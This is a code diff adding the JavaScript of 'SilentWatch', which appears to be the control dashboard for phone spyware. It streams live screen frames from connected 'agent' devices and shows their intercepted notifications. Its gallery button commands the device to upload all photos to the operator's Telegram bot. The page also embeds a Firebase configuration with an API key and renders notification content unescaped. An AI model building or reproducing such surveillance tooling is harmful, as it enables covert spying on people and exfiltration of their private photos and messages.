+  btn.className = `btn btn-warn${lowNetOn ? ' on' : ''}`;
+  log(`⚡ Low Internet: ${lowNetOn ? 'ON' : 'OFF'}`);
+}
+
+function fetchGallery() {
+  if (!ws || ws.readyState !== WebSocket.OPEN || !selectedAgent) return;
+  const btn = document.getElementById('btn-gallery');
+  const status = document.getElementById('gallery-status');
+  ws.send(JSON.stringify({ command: 'download_all_photos', agent_id: selectedAgent }));
+  log('🖼 Gallery fetch → Telegram sent to ' + selectedAgent, 's');
+  btn.classList.add('sending');
+  btn.disabled = true;
+  status.style.display = 'block';
+  status.textContent = '📤 Request sent! Photos uploading to Telegram…';
+  setTimeout(() => {
+    btn.classList.remove('sending');
+    btn.disabled = false;
+    status.textContent = '✓ Done — check your Telegram bot.';
+    setTimeout(() => { status.style.display = 'none'; }, 4000);
+  }, 3000);
+}
+
+// ── Notifications ─────────────────────────────────────────────────────────────
+function addNotification(app, title, text, ts, imgBase64 = null) {
+  const feed = document.getElementById('notif-feed');
+  if (feed.querySelector('.no-notifs')) feed.innerHTML = '';
+  const timeStr = ts
+    ? new Date(ts).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
+    : new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+  const d = document.createElement('div');
+  d.className = 'notif-card';
+  const imgHtml = imgBase64
+    ? `<img src="data:image/jpeg;base64,${imgBase64}" class="notif-img" onclick="openImg(this.src)"/>`
+    : '';
+  d.innerHTML = `
+    <div class="notif-header">
+      <span class="notif-app">${app}</span>
+      <span class="notif-time">${timeStr}</span>
+    </div>
+    <div class="notif-title">${title || 'No Title'}</div>
+    <div class="notif-body">${text || ''}</div>
+    ${imgHtml}`;
+  feed.prepend(d);
+  while (feed.children.length > 50) feed.removeChild(feed.lastChild);
+  // Badge
+  if (document.getElementById('tab-notif-btn').classList.contains('active') === false) {
+    notifCount++;
+    const b = document.getElementById('notif-badge');
+    b.textContent = notifCount > 9 ? '9+' : notifCount;
+    b.classList.add('show');
+  }
+  showToast(app, title, text, imgBase64);
+}
+
+function showToast(app, title, text, imgBase64 = null) {
+  const wrap = document.getElementById('toast-wrap');
+  const t = document.createElement('div');
+  t.className = 'toast';
+  t.innerHTML = `<div class="toast-app">${app}</div><div class="toast-body">${title}: ${text}</div>`;
+  wrap.appendChild(t);
+  setTimeout(() => {
+    t.style.transition = 'all .5s ease';
+    t.style.opacity = '0';
+    t.style.transform = 'translateX(-20px)';
+    setTimeout(() => t.remove(), 500);
+  }, 5000);
+  while (wrap.children.length > 3) wrap.removeChild(wrap.firstChild);
+}
+
+function openImg(src) {
+  const w = window.open('');
+  w.document.write(`<html><body style="margin:0;background:#000;display:grid;place-items:center;height:100vh"><img src="${src}" style="max-width:100%;max-height:100vh;object-fit:contain"/></body></html>`);
+  w.document.close();
+}
+
+// ── WebSocket connection ───────────────────────────────────────────────────────
+function scheduleReconnect() {
+  if (manualClose) return;
+  clearTimeout(reconnectTimer);
+  const secs = (reconnectDelay / 1000).toFixed(0);
+  log(`Retrying in ${secs}s…`, 'w');
+  document.getElementById('placeholder-txt').textContent = `Reconnecting in ${secs}s…`;
+  reconnectTimer = setTimeout(() => {
+    if (!manualClose) connect(false);
+  }, reconnectDelay);
+  reconnectDelay = Math.min(reconnectDelay * 2, 30000);
+}
+function resetReconnect() { reconnectDelay = 1000; clearTimeout(reconnectTimer); reconnectTimer = null; }
+
+function toggleConnect() {
+  if (ws && ws.readyState === WebSocket.OPEN) { disconnect(); return; }
+  manualClose = false; resetReconnect(); connect(true);
+}
+
+function connect(isManual = true) {
+  const inp = document.getElementById('url-input');
+  const url = (inp && inp.value.trim()) || localStorage.getItem('sw_url') || '';
+  if (!url) { log('No WebSocket URL. Run: python start_tunnel.py', 'e'); return; }
+  if (inp) inp.value = url;
+  if (isManual) localStorage.setItem('sw_url', url);
+  if (ws) { try { ws.close(); } catch(e){} }
+  log(`Connecting to ${url}…`);
+  setTunnelConnecting(url);
+  try { ws = new WebSocket(url); } catch(e) { log(`Bad URL: ${e.message}`, 'e'); scheduleReconnect(); return; }
+  ws.binaryType = 'arraybuffer';
+
+  ws.onopen = () => {
+    ws.send(JSON.stringify({ role: 'admin' }));
+    resetReconnect(); setServer(true);
+    log('Connected to broker.', 's');
+    document.getElementById('placeholder-txt').textContent = 'Awaiting Agent…';
+    document.getElementById('btn-connect').style.display = 'none';
+    document.getElementById('btn-disconnect').style.display = 'block';
+    setTunnelActive(url);
+    clockTick = setInterval(() => {
+      const ts = new Date().toLocaleTimeString();
+      document.getElementById('hud-ts').textContent = ts;
+    }, 1000);
+    heartbeatTick = setInterval(() => {
+      if (ws && ws.readyState === WebSocket.OPEN) ws.send(JSON.stringify({ command: 'ping' }));
+    }, 5000);
+  };
+
+  ws.onclose = () => {
+    setServer(false); setAgentPill(false); setLive(false);
+    if (pendingFrame) { URL.revokeObjectURL(pendingFrame); pendingFrame = null; }
+    rafScheduled = false; updateAgents([]); setControls(false); selectedAgent = null;
+    clearInterval(clockTick); clearInterval(heartbeatTick);
+    document.getElementById('btn-connect').style.display = 'block';
+    document.getElementById('btn-disconnect').style.display = 'none';
+    document.getElementById('watching-tag').textContent = '—';
+    if (!manualClose) { setTunnelWaiting(); log('Connection lost. Reconnecting…', 'w'); scheduleReconnect(); }
+    else { setTunnelWaiting(); log('Disconnected.', 'w'); }
+  };
+
+  ws.onmessage = (evt) => {
+    if (evt.data instanceof ArrayBuffer) {
+      if (pendingFrame) URL.revokeObjectURL(pendingFrame);
+      pendingFrame = URL.createObjectURL(new Blob([evt.data], { type: 'image/jpeg' }));
+      if (!rafScheduled) { rafScheduled = true; requestAnimationFrame(renderFrame); }
+      setLive(true); setAgentPill(true); frames++; fpsCount++;
+      document.getElementById('s-frames').textContent = frames;
+      document.getElementById('hud-frame-num').textContent = frames;
+      const kb = (evt.data.byteLength / 1024).toFixed(1);
+      document.getElementById('s-kb').textContent = kb;
+      document.getElementById('hud-kb').innerHTML = kb + ' <span>KB</span>';
+      tickFPS(); return;
+    }
+    try {
+      const m = JSON.parse(evt.data);
+      if (m.type === 'pong') return;
+      if (m.type === 'agent_list') { updateAgents(m.agents); return; }
+      if (m.type === 'watching') { log(`✓ Watching confirmed: ${m.agent_id}`, 's'); return; }
+      if (m.type === 'notification') {
+        log(`🔔 ${m.app_name}: ${m.title}`, 'w');
+        addNotification(m.app_name, m.title, m.text, m.timestamp, m.image);
+        return;
+      }
+      if (m.type === 'gallery_status') {
+        const msg = m.message || m.status || JSON.stringify(m);
+        log(`🖼 Gallery: ${msg}`, 's');
+        // Update the gallery panel status text
+        const status = document.getElementById('gallery-status');
+        if (status) {
+          status.style.display = 'block';
+          status.textContent = `📱 Device: ${msg}`;
+          // Auto-hide after 8s
+          clearTimeout(window._galleryHideTimer);
+          window._galleryHideTimer = setTimeout(() => { status.style.display = 'none'; }, 8000);
+        }
+        // Show a toast so user sees it even on other tabs
+        showToast('Gallery', '🖼 Photo Upload', msg);
+        return;
+      }
+      if (m.type === 'agent_message') { log(`📱 Agent: ${JSON.stringify(m)}`); return; }
+    } catch(e) { console.error('Parse error', e); }
+  };
+
+  ws.onerror = (e) => log('WebSocket error', 'e');
+}
+
+function disconnect() {
+  manualClose = true; resetReconnect();
+  if (ws) { ws.close(); ws = null; }
+}
+
+// ── Init ───────────────────────────────────────────────────────────────────────
+const savedUrl = localStorage.getItem('sw_url');
+const urlInp = document.getElementById('url-input');
+if (savedUrl && urlInp) urlInp.value = savedUrl;
+urlInp.addEventListener('change', e => localStorage.setItem('sw_url', e.target.value.trim()));
+setTunnelWaiting();
+log('SilentWatch dashboard ready.', 's');
+</script>
+
+<!-- ── Firebase Auto-Sync ── -->
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
+const cfg = {
+  apiKey:"AIzaSyC-dFMtinq0MdsgjDhEzsvesvSDnIr04DQ",
+  authDomain:"raju-122f3.firebaseapp.com",
+  databaseURL:"https://raju-122f3-default-rtdb.firebaseio.com",
+  projectId:"raju-122f3",
+  storageBucket:"raju-122f3.firebasestorage.app",
+  messagingSenderId:"529201617803",
+  appId:"1:529201617803:web:2bb0ba27255c26dceb2d8e",
+  measurementId:"G-EV8CMJG900"
+};
+try {
+  const app = initializeApp(cfg);
+  const db = getDatabase(app);
+  onValue(ref(db, 'config/serverUrl'), (snap) => {
+    const url = snap.val();
+    if (!url) return;
+    const already = typeof ws !== 'undefined' && ws && (ws.readyState === WebSocket.OPEN || ws.readyState === WebSocket.CONNECTING);
+    if (already && localStorage.getItem('sw_url') === url) return;
+    const inp = document.getElementById('url-input');
+    if (inp) inp.value = url;
+    localStorage.setItem('sw_url', url);
+    if (typeof log === 'function') log(`☁️ Cloud URL → ${url}`, 's');
+    if (typeof setTunnelConnecting === 'function') setTunnelConnecting(url);
+    if (typeof manualClose !== 'undefined') {
+      manualClose = false;
+      if (typeof resetReconnect === 'function') resetReconnect();
+      if (typeof ws !== 'undefined' && ws) { try { ws.close(); } catch(e){} }
+      setTimeout(() => { if (typeof connect === 'function') connect(true); }, 300);
+    }
+  });
+} catch(e) { console.error('Firebase error:', e); }
+</script>
+
+</body>
+</html>
